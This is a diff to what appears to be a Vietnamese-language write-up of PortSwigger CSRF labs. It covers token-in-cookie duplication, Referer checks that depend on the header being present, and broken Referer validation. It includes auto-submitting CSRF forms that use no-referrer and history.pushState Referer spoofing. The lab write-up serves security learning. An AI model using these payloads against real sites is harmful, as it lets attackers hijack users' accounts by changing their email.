@@ -159,7 +159,7 @@ Bên server đã chấp nhận, sau đó ta sẽ thực hiện tương tự như
 
 ```
 
-lab5: 
+## [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
 
 Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng vẫn thế, ta chỉ cần thay csrfKey ở bài trước thành csrf ở bài này, đặc biệt là giá trị csrf ở đây được tùy chỉnh miễn là 2 cái giống nhau là được nên ta có thể dùng script như bên dưới để thực hiện luôn: 
 
@@ -176,3 +176,64 @@ Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng v�
  onerror="document.forms[0].submit()">
  
  ```
+
+## [10. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)
+
+Trong kịch bản ở 2 bài lab cuối 10 và 11 này, ngoài kiểu chống csrf attack với csrf token và bypass csrf samesite thì ứng dụng có thể sử dụng cả http referer header.
+
+Với phương án này, ứng dụng sẽ xác nhận xem request có xuất phát từ domain tương ứng haykhoong nên nhìn chung sẽ kém hiểu quả hơn. Cụ thể ở bài lab này sẽ có kịch bản là quá trình xác minh tùy thuộc vào sự có mặt của referer header.
+
+Vẫn như các bài lab trước ta đăng nhập và update email: 
+
+![image](https://user-images.githubusercontent.com/104350480/225495034-dfc34657-f262-4225-ab9f-0f4057c97e6f.png)
+
+Mở burpsuite phần post /change-email và chú ý phần referer, khi ta chinh sửa nó thì nó sẽ có vấn đề:
+
+![image](https://user-images.githubusercontent.com/104350480/225495981-669bba27-7048-4940-bfb1-184f02d970d8.png)
+
+Nhưng như tên bài, nó dựa vào việc có mặt của referer giống như bài lab dựa vào sự có mặt của csrf token, ta cắt xén nó đi thì vẫn oke: 
+
+Nên ta có thể thực hiện exploit luôn: 
+
+```
+Với phần header: 
+<meta ='referrer' content='no-referrer'>
+Với phần body:
+<form id='csrf' method='POST' action='https://0ac1007e04ca2608c0d70d04006b00c2.web-security-academy.net/my-account/change-email'>
+<input type='hidden' name='email' value='manhhuy2002@gmail.com'
+<input type='submit'>
+</form> 
+<script>document.getElementById('csrf').submit();</script>
+```
+## [11. SRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)
+
+Ở bài lab tiếp theo này thì đã được xử lí tình huống ở bài lab trước, khi cắt đi referer header thì sẽ bị báo lỗi:
+
+![image](https://user-images.githubusercontent.com/104350480/225498371-9ef4843f-2127-4e76-9c56-ede6fd832b01.png)
+
+Nhưng vấn đề ở đây là server sẽ chỉ kiểm tra sự có mặt của nó còn thêm mắm muối vào lại không sao cả:
+
+![image](https://user-images.githubusercontent.com/104350480/225498574-364a6670-aae3-4033-acb5-6bbd63b75c7b.png)
+
+Để giải quyết bài lab này ta có thể sử dụng hàm history.pushState() với các tham số history.pushState(state,title,url) , hàm này dược sử dụng để thêm trạng thái mới của trình duyệt mà không ảnh hưởng hay phải load lại nội dung hiện tại của trang web. Tham số thứ 3 ta sẽ lợi dụng ở đây là url để cập nhận url hiển thị trong thanh trình duyện mà không làm tải lại trang web. VIệc này cho phép ta đánh dấu trang web và chuyển hướng đến trang đó trong tương lai mà không mất bất kì dữ liệu nào hiện tại trên trang web. Mục đích sử dụng hàm history.pushState() để tạo một trạng thái mới trong lịch sử trình duyệt của nạn nhân. Khi nạn nhân click vào đường link, trình duyệt sẽ lưu trữ URL trên đó được truy cập từ trang web gốc của nạn nhân.
+
+Vẫn vậy ta dùng đoạn code sau để exploit, ta truyền vào 1 url tương đối cũng được: 
+
+```
+<script> history.pushState("", "", "/?12342340ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account") </script>
+<form id='csrf' method='POST' action='https://0ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account/change-email' >
+<input type='hidden' name='email' value='manhhuy2002@gmail.com' >
+<input type='submit' >
+</form>
+<script> document.getElementById('csrf').submit() </script>
+
+```
+
+Nhưng mà khi chạy như trên ta sẽ bị lỗi trả về: 
+
+![image](https://user-images.githubusercontent.com/104350480/225505658-f5d366ac-6f3a-4d7b-93db-35bab7e180fc.png)
+
+Có thể ở đây là do một số browser sẽ triển khai giải pháp bảo mật và tự động cắt cái query string ra khỏi referer header. Để đảm bảo không bị cắt xén thì ta có thể cập nhập thêm nội dung: Referer-Policy vào phần Head section của exploit như sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/225505981-463b307b-61f9-416d-a566-ef46856632e5.png)
+
